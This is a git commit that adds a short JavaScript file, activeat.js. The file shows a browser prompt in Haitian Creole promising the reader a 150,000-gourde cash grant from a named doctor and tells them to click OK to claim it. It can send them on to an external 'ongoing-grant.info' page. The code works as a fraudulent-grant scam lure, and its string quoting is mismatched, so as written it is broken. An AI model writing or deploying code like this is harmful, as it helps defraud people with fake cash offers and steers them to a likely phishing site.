a8c17b0049f2dfe5e6b78cdbb9254ff335b6642e
The-On-going <sirpeelawson@gmail.com>
2026-08-04 22:31:22 +0100

    Create activeat.js

---
+++ activeat.js
@@ -0,0 +1,10 @@
+var password = 'RETIRE G 150,000';
+
+password = prompt(
+  "Felisitasyon, ou kalifye pou resevwa yon Sibvansyon Lajan Kach G 150,000 nan men DR. HERRIOT TABUTEAU. Klike sou OK pou resevwa li imedyatman.',
+  'RETIRE G 150,000'
+);
+
+if (password !== 'RETIRE G 150,000') {
+    location.href = 'https://ongoing-grant.info/G150000-Sibvansyon.html';
+}
